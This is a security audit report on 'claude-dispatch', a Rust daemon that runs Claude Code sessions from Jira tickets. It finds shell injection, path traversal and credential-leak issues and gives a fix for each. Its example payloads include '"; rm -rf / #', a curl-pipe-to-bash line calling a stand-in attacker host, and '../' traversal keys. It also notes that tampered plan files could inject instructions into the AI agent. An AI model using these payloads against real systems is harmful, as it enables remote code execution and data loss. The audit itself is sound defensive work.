# Security Audit Report — claude-dispatch

**Date:** 2026-03-29
**Scope:** Full source review of `claude-dispatch` (Rust daemon, ~900 LOC)
**Framework:** OWASP Top 10 (2021) + general secure-coding best practices

---

## Executive Summary

`claude-dispatch` is a Rust daemon that bridges Jira tickets to automated Claude Code sessions via tmux. The most critical security risks stem from **shell injection** in the spawner's bash wrapper script, where Jira-sourced data (ticket keys, summaries) flows unsanitized into a generated shell script. Several medium-severity issues exist around credential handling, path traversal, and missing input validation.

---

## Findings by Severity

### CRITICAL

#### 1. Shell Injection via Wrapper Script Generation (`spawner.rs:116-162`)

**OWASP:** A03:2021 — Injection

The `spawn_tmux_session` function builds a bash script by interpolating variables directly into a `format!()` string that becomes executable shell code:

```rust
let script_content = format!(
    r#"#!/bin/bash
TICKET_KEY="{ticket_key}"
REPO_ROOT="{repo_root}"
...
"#,
    ticket_key = ticket_key,
    repo_root = repo_root.display(),
    ...
);
```

If any of these values contain shell metacharacters (e.g., `"; rm -rf / #`), they break out of the double-quoted bash string and execute arbitrary commands. The `ticket_key` originates from Jira API responses — an attacker who can create a Jira ticket with a crafted key (or compromise the Jira instance) achieves **remote code execution** on the machine running `claude-dispatch`.

**Affected fields:** `ticket_key`, `repo_root`, `claude_home`, `binary` (current_exe), `plan_file`, `config_path`, `claude_args` (which includes `extra_flags` from config).

**Fix:** Validate `ticket_key` against an allowlist pattern (`^[A-Z][A-Z0-9]+-\d+$`). Shell-escape all interpolated values, or pass them via environment variables in the bash script (which avoids string interpolation entirely).

---

#### 2. Arbitrary Shell Command Injection via `extra_flags` (`spawner.rs:108-111`)

**OWASP:** A03:2021 — Injection

```rust
if !config.claude.extra_flags.is_empty() {
    claude_args.push_str(&config.claude.extra_flags);
}
```

`extra_flags` is written verbatim into the bash script. If the config file is writable by a non-root user or pulled from an untrusted source, an attacker can inject arbitrary shell commands (e.g., `; curl attacker.com/shell.sh | bash`).

**Fix:** Parse `extra_flags` into a `Vec<String>` and validate each flag starts with `-`. Better yet, use an allowlist of known Claude CLI flags.

---

### HIGH

#### 3. Path Traversal via Ticket Key (`spawner.rs:114`, `jira/mod.rs:100`)

**OWASP:** A01:2021 — Broken Access Control

Ticket keys are used to construct file paths without validation:

```rust
// spawner.rs
let script_path = state_dir.join(format!("run-{}.sh", ticket_key));

// jira/mod.rs
let file_path = output_dir.join(format!("{}.md", ticket.key));
```

A ticket key containing `../` (e.g., `../../etc/cron.d/backdoor`) could write files outside the intended directories. While Jira normally enforces key formats, this is a trust-boundary violation — the application should enforce its own invariants.

**Fix:** Validate ticket keys match `^[A-Z][A-Z0-9]+-\d+$` before using them in any file path or shell context.

---

#### 4. Plan File Content as Shell-Interpreted Prompt (`spawner.rs:136-138`)

**OWASP:** A03:2021 — Injection

```bash
PROMPT=$(cat "$PLAN_FILE")
claude {claude_args}  # contains -p "$PROMPT"
```

The plan file's entire content is loaded into a shell variable via `cat` and then passed as an argument. While double-quoting `$PROMPT` prevents word-splitting, extremely large plan files could exceed `ARG_MAX`, and certain content patterns could still interact with the shell in unexpected ways.

**Fix:** Use a file-based prompt mechanism (e.g., `claude --print < plan_file`) instead of passing file content as a command-line argument.

---

### MEDIUM

#### 5. Plaintext Credential Storage (`config.rs`, `config.toml`)

**OWASP:** A02:2021 — Cryptographic Failures, A07:2021 — Identification and Authentication Failures

The Jira API token is stored as a plaintext string in `config.toml`:

```toml
api_token = "your-api-token"
```

While `config.toml` is in `.gitignore`, the token is:
- Loaded into memory as a `String` (not zeroized on drop)
- Available via the `Debug` derive on `JiraConfig`, meaning any `tracing::debug!("{:?}", config)` would leak it to logs
- Passed to the `JiraClient` which stores it as a base64-encoded `String` in memory for the lifetime of the process

**Fix:**
- Support reading the API token from an environment variable (e.g., `JIRA_API_TOKEN`)
- Implement a custom `Debug` for `JiraConfig` that redacts `api_token`
- Consider using `secrecy::SecretString` to prevent accidental logging and enable zeroization

---

#### 6. `Debug` Derive Leaks Secrets (`config.rs:40-50`, `config.rs:52-62`)

**OWASP:** A09:2021 — Security Logging and Monitoring Failures

Both `Config` and `JiraConfig` derive `Debug`, which would include `api_token` in any debug-level log output:

```rust
#[derive(Debug, Deserialize, Clone)]
pub struct JiraConfig {
    pub api_token: String,  // leaked in Debug output
    ...
}
```

**Fix:** Implement `Debug` manually for `JiraConfig` to redact `api_token`.

---

#### 7. No Input Validation on `mark-done` CLI Argument (`main.rs:75-77`)

**OWASP:** A03:2021 — Injection

The `ticket_key` argument from the CLI is passed to `handle_mark_done` with no validation. It flows into:
- A SQL query (parameterized — safe from SQLi)
- A file path construction: `state_dir.join(format!("run-{}.sh", ticket_key))` — vulnerable to path traversal

A user running `claude-dispatch mark-done "../../etc/important"` could delete files outside the state directory.

**Fix:** Validate the ticket key format before use.

---

#### 8. No Request Timeout or Rate Limiting on Jira API (`jira/client.rs`)

**OWASP:** A05:2021 — Security Misconfiguration

`reqwest::Client::new()` creates a client with default settings — no explicit connection timeout, request timeout, or retry backoff. A slow or unresponsive Jira instance could cause the sync loop to hang indefinitely.

**Fix:** Configure `reqwest::ClientBuilder` with explicit timeouts:
```rust
reqwest::Client::builder()
    .timeout(Duration::from_secs(30))
    .connect_timeout(Duration::from_secs(10))
    .build()?
```

---

### LOW

#### 9. SQLite Concurrent Access Without `busy_timeout` (`state.rs:27`)

**OWASP:** A05:2021 — Security Misconfiguration

Two concurrent tokio tasks (sync loop and spawner loop) open separate `Connection` instances to the same SQLite file. Without `PRAGMA busy_timeout`, concurrent writes will fail immediately with `SQLITE_BUSY` instead of retrying.

**Fix:** Add `PRAGMA busy_timeout = 5000;` after enabling WAL mode.

---

#### 10. Wrapper Script Permissions (`spawner.rs:167`)

**OWASP:** A01:2021 — Broken Access Control

The wrapper script is created with mode `0o755` (world-readable and executable). On a multi-user system, other users could read the script (which contains paths and config info) or replace it between creation and execution (TOCTOU).

**Fix:** Use `0o700` for the wrapper script permissions. Consider writing to a tmpdir with restricted permissions.

---

#### 11. No Integrity Verification of Plan Files

**OWASP:** A08:2021 — Software and Data Integrity Failures

Plan files are written by the sync loop and later read by the spawner loop. There is no integrity check (e.g., checksum) between write and read. An attacker with filesystem access could modify the plan file to inject malicious instructions that Claude Code would execute.

**Fix:** Store a hash of the plan file content in SQLite when marking `planned`, and verify it before spawning.

---

#### 12. Error Messages May Leak Internal Paths (`jira/client.rs:69`)

**OWASP:** A09:2021 — Security Logging and Monitoring Failures

```rust
return Err(format!("Jira API error {}: {}", status, body).into());
```

The full Jira API error response body is propagated. Depending on the Jira instance configuration, this could include internal URLs, stack traces, or configuration details.

**Fix:** Log the full body at `debug` level but return only the status code in the error.

---

## What's Done Well

| Area | Assessment |
|------|-----------|
| **SQL Injection** | All SQL queries use parameterized `params![]` — no SQL injection risk |
| **TLS** | Uses `rustls-tls` (memory-safe TLS), avoids OpenSSL |
| **Dependency hygiene** | Small, well-known dependency set; no unnecessary crates |
| **Config file protection** | `config.toml` is in `.gitignore` |
| **Atomic state transitions** | `claim_for_spawning` uses conditional UPDATE for race-free claiming |
| **WAL mode** | SQLite WAL mode enables concurrent reads during writes |
| **No `unsafe` code** | No `unsafe` blocks in the entire codebase |

---

## OWASP Top 10 Coverage Summary

| # | Category | Status | Findings |
|---|----------|--------|----------|
| A01 | Broken Access Control | **Issues found** | Path traversal via ticket key (#3), world-readable scripts (#10) |
| A02 | Cryptographic Failures | **Issues found** | Plaintext credential storage (#5) |
| A03 | Injection | **CRITICAL** | Shell injection in wrapper script (#1, #2), CLI path traversal (#7) |
| A04 | Insecure Design | Low risk | Architecture is straightforward; main risk is the shell-based spawner pattern |
| A05 | Security Misconfiguration | **Issues found** | No HTTP timeouts (#8), no SQLite busy_timeout (#9) |
| A06 | Vulnerable Components | No issues | Dependencies are up-to-date and minimal |
| A07 | Auth Failures | **Issues found** | Plaintext API token in config (#5) |
| A08 | Data Integrity Failures | **Issues found** | No plan file integrity checks (#11) |
| A09 | Logging Failures | **Issues found** | Debug trait leaks secrets (#6), error messages leak paths (#12) |
| A10 | SSRF | Low risk | Jira URL is constructed from config, not user input |

---

## Recommended Priority Order

1. **Validate ticket keys** (blocks #1, #3, #7) — regex `^[A-Z][A-Z0-9]+-\d+$`
2. **Shell-escape wrapper script variables** or pass via env vars (blocks #1, #2)
3. **Redact secrets from Debug** (blocks #6)
4. **Add HTTP timeouts** (blocks #8)
5. **Add SQLite busy_timeout** (blocks #9)
6. **Restrict script permissions to 0o700** (blocks #10)
7. **Support env var for API token** (blocks #5)
